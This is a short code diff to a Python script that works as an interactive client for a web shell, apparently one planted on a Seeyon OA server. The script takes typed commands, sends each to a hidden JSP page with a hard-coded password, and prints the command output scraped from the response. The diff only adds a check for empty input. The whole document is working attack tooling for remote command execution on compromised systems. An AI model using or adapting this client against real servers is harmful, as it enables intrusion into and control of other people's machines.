@@ -17,12 +17,19 @@ while 1:
     except:
         print("\nBye~ I Love You~~~")
         sys.exit(1)
+
+    if not command:
+        print("[Info] Empty command")
+        continue
+
     exp_url = url + "/seeyon/test123456.jsp?pwd=asasd3344&cmd=cmd%20+/c+" + quote(command)
+
     try:
         req = requests.get(exp_url)
     except:
         print("[Error]", exp_url)
         continue
+
     if req.status_code == 200:
         result = re.findall("<pre>(.*?)</pre>", req.text, re.S)[0]
         print(result)
